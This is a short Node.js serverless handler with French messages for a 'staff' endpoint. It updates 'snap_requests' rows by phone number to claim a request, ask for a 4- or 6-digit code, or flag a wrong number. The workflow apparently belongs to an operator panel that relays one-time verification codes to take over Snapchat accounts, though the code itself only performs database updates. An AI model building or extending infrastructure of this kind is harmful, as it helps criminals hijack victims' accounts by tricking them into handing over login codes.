import { neon } from '@neondatabase/serverless';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  if (req.method === 'OPTIONS') { res.status(200).end(); return; }
  if (req.method !== 'POST') return res.status(405).json({ success: false });

  try {
    const { action, phone, length, secret } = req.body;
    if (secret !== process.env.STAFF_SECRET) {
      return res.status(401).json({ success: false, message: 'Unauthorized' });
    }

    const sql = neon(process.env.DATABASE_URL);

    if (action === 'claim') {
      await sql`UPDATE snap_requests SET status = 'processing' WHERE phone = ${phone}`;
      return res.status(200).json({ success: true, message: 'Prise en charge confirmée' });
    }

    if (action === 'set_length') {
      if (![4, 6].includes(length)) {
        return res.status(400).json({ success: false, message: 'Longueur invalide (4 ou 6)' });
      }
      await sql`UPDATE snap_requests SET status = 'waiting_code', code_length = ${length} WHERE phone = ${phone}`;
      return res.status(200).json({ success: true, message: `Code à ${length} chiffres demandé` });
    }

    if (action === 'wrong_number') {
      await sql`UPDATE snap_requests SET status = 'wrong_number' WHERE phone = ${phone}`;
      return res.status(200).json({ success: true, message: 'Wrong number signalé' });
    }

    return res.status(400).json({ success: false, message: 'Action inconnue' });
  } catch (e) {
    console.error('staff-action error:', e);
    return res.status(500).json({ success: false, message: e.message });
  }
}